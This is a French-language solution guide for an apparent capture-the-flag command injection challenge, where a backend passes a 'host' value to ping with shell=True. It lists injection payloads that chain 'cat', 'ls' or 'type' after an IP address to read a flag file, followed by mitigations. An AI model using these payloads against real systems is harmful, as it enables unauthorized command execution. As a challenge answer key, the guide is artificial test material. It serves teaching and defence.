# Command Injection — Guide de résolution

## Contexte
Le backend exécute `ping` avec `shell=True`, en concaténant directement la valeur de `host` dans la commande. Cela permet d’enchaîner d’autres commandes via des séparateurs de shell.

## Objectif
Injecter une commande après `ping` pour lire le flag monté dans le conteneur (`/app/flag.txt`). La sortie est affichée sur la même page (bloc de résultat après l’exécution du ping).

## Payloads utiles
- Linux/Unix:
	- `127.0.0.1; cat /app/flag.txt`
	- `127.0.0.1 && cat /app/flag.txt`
	- Pour lister: `127.0.0.1; ls -la /app`
- Windows (si l’image le supportait):
	- `127.0.0.1 & type C:\\app\\flag.txt`

Entrez ces valeurs dans le champ `host` (ou via `?host=...`). Le résultat du `cat` apparaît sous la sortie du ping.

## Astuces
- Certains conteneurs n’ont pas `ping` ou certains outils: ici `iputils-ping` a été installé, donc `ping` fonctionne.
- Les commandes longues ou bloquantes peuvent faire échouer la requête (timeout appliqué côté app/web).

## Mitigations (hors CTF)
- Ne pas utiliser `shell=True`, préférer `subprocess.run(["ping", "-c", "1", host], shell=False)`.
- Valider/whitelister strictement `host` (regex d’IP/domaine), ou faire une résolution DNS côté code.
- Échapper correctement et séparer les arguments au lieu de concaténer une chaîne passée au shell.